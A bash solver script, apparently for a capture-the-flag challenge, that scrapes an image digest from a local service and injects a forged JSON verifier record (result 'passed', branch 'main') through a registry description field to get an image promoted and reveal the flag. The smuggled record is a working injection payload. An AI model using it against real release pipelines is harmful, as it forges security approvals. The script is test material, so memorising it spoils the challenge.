#!/usr/bin/env bash
# The registry description becomes a second JSON record in the verifier's input.
set -euo pipefail

TARGET=${TARGET:-http://localhost:8080}
page=$(curl -fsS "$TARGET/")
digest=$(grep -oE 'sha256:[0-9a-f]{64}' <<< "$page" | head -1)
[[ -n "$digest" ]] || { echo "solve: image digest not found" >&2; exit 1; }

# Plain descriptions must not grant access; only the forged record should.
denied=$(curl -fsS --data-urlencode 'description=Just a night-watch camera.' "$TARGET/promote")
if grep -q 'noco-flag' <<< "$denied"; then
  echo "solve: benign description was approved" >&2
  exit 1
fi

payload=$(jq -nc --arg digest "$digest" \
  '{digest:$digest,source:{branch:"main"},result:"passed"}')
response=$(curl -fsS --data-urlencode "description=$payload" "$TARGET/promote")
flag=$(grep -oE 'noco\{[^}]+\}' <<< "$response" | head -1)
[[ -n "$flag" ]] || { echo "solve: promotion did not reveal a flag" >&2; exit 1; }
echo "$flag"
